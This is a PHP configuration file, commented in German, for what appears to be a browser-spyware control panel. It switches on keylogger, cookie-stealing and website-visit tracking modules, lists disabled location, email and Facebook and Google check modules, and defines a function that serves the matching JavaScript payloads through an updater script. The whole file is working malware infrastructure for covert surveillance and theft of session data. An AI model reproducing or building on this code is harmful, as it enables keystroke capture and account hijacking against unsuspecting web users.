<?php

/* ERROR REPORTING */
error_reporting(E_ALL^E_NOTICE);
ini_set('display_errors', 1);

header( 'Content-type: text/html; charset=utf-8' );
date_default_timezone_set('Europe/Berlin');
session_set_cookie_params(time()+60*60*24*30); 
session_start();

include_once('mysql_con.php'); // Verbinden zur Datenbank


$showurl = 10; // Anzahl Einträge, die angezeigt werden


$list = array(); // Diese Aufgaben sind hier (de)aktivierbar
$list[] = "url";
$list[] = "keylogger";
$list[] = "cookies";
//$list[] = "loc";
//$list[] = "email";
//$list[] = "facebook_check";
//$list[] = "google_check";
//$list[] = "instant";

function print_code($filename){ // Diese Files werden auf der updater.php ausgegeben
	$f = array();
	$f["jquery"] = "ui/data/jquery.min.js";
	$f["basic"] = "scripts/basic.js";
	$f["eval"] = "scripts/evaluate.js";
	$f["url"] = "scripts/url.js";
	$f["keylogger"] = "scripts/keylogger.js";
	$f["cookies"] = "scripts/cookies.js"; 
	//$f["loc"] = "loc.js";
	//$f["email"] = "email.js";
	//$f["instant"] = "instant.js";
	//$f["facebook_check"] = "fb_check.js";
	//$f["google_check"] = "google_check.js";
	
	$path = "";
	$file = $path.$f[$filename];
	$handle = fopen($file, "r");
	echo fread($handle, filesize($file));
	fclose($handle);
}


function type2text($in){
	switch($in){
		case "cookies":
			return "Cookies";
			break;
		case "url":
			return "Webseitenbesuche";
			break;
		case "keylogger":
			return "Keylogger";
			break;
		default:
			return $in;
			break;
	}
}
include_once('functions.php'); // Einbinden der Funktionen

?>